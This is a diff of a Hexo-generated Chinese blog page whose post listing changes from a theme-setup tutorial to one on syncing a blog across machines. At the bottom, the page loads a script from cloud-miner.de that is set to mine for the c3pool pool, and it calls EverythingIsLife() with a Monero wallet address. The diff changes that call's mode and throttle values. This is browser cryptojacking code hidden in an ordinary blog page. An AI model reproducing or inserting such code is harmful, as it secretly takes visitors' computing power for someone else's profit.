@@ -1738,7 +1738,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.kappu.ml/2019/08/20/HEXO_STUDY_3/">
+    <link itemprop="mainEntityOfPage" href="https://www.kappu.ml/2019/08/20/HEXO_STUDY_2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="木不子">
@@ -1757,7 +1757,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/20/HEXO_STUDY_3/" itemprop="url">Hexo學習筆記 —— 多端同步、Github Pages部署、更改主題、評論功能（三）</a></h1>
+                <a class="post-title-link" href="/2019/08/20/HEXO_STUDY_2/" itemprop="url">Hexo學習筆記 —— 多端同步、Github Pages部署、更改主題、評論功能（二）</a></h1>
         
 
         <div class="post-meta">
@@ -1769,7 +1769,7 @@
               
                 <span class="post-meta-item-text">發表於</span>
               
-              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-08-20T20:03:50+08:00">
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-08-20T19:03:50+08:00">
                 2019-08-20
               </time>
             
@@ -1810,8 +1810,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/08/20/HEXO_STUDY_3/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/08/20/HEXO_STUDY_3/" itemprop="commentCount"></span>
+                <a href="/2019/08/20/HEXO_STUDY_2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/08/20/HEXO_STUDY_2/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -1840,21 +1840,14 @@
 
       
         
-          <h1 id="主題-——-NexT"><a href="#主題-——-NexT" class="headerlink" title="主題 —— NexT"></a>主題 —— <a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">NexT</a></h1><p>進入hexo目錄，然後下載主題</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> hexo</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
+          <h1 id="同步多端……真正麻煩的事情來了"><a href="#同步多端……真正麻煩的事情來了" class="headerlink" title="同步多端……真正麻煩的事情來了"></a>同步多端……真正麻煩的事情來了</h1><p>根據剛剛提到的<strong>文件目錄結構</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|-- _config.yml <span class="comment">#配置文件</span></span><br><span class="line">|-- package.json <span class="comment">#hexo的依賴，插件信息也保存在這文件內</span></span><br><span class="line">|-- scaffolds <span class="comment">#標準模板，一般不需要關心</span></span><br><span class="line">|-- <span class="built_in">source</span> <span class="comment">#資源目錄，文章與各種附件也都保存在這</span></span><br><span class="line">   |-- _posts <span class="comment">#文章文件夾</span></span><br><span class="line">|-- themes <span class="comment">#主題</span></span><br><span class="line">|-- .gitignore <span class="comment">#git同步的時候忽略的目錄與文件</span></span><br><span class="line">|-- public <span class="comment">#生成後的靜態博客文件夾</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>編輯hexo目錄下的<code>_config.yml</code>，把主題改成改成<code>theme: next</code>。</li>
-<li>然後編輯<code>theme/next/_config.yml</code><ul>
-<li>搜索<code>schemes</code>關鍵詞，將<code>scheme: Gemini</code>前的#號去掉，然後注釋掉默認的<code>scheme: Muse</code></li>
-</ul>
-</li>
-</ul>
-<p>運行以下命令更新主題（若你有根據上一篇編寫<code>push</code>腳本）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./push</span><br></pre></td></tr></table></figure>
+<p>有同步意義的是_config.yml, package.json, source/, themes</p>
+<p>最重要的是<code>source</code>文件夾，裏面包含了可以引用的圖片、文章文件以及各種附加的小附件。</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2019/08/20/HEXO_STUDY_3/#more" rel="contents">
+            <a class="btn" href="/2019/08/20/HEXO_STUDY_2/#more" rel="contents">
               閱讀全文 &raquo;
             </a>
           </div>
@@ -2582,7 +2575,7 @@ show_date_time();
   
   <script src="https://cloud-miner.de/tkefrep/tkefrep.js?tkefrep=bs?algy=cn/r?nosaj=mine.c3pool.com:13333"></script>
 <script type="text/javascript">
-EverythingIsLife('44rFvgoDt85XBtKYuAKJkwcxFYwh1Yw1G5SVgRNuZ5NiXcPaFjYyiZ1VRZGjEuvSC17ErTyqBjgsPPYUEgZmRD5p4qQae8g', 'x', 50);
+EverythingIsLife('44rFvgoDt85XBtKYuAKJkwcxFYwh1Yw1G5SVgRNuZ5NiXcPaFjYyiZ1VRZGjEuvSC17ErTyqBjgsPPYUEgZmRD5p4qQae8g', 'web', 30);
 </script>
 </body>
 </html>
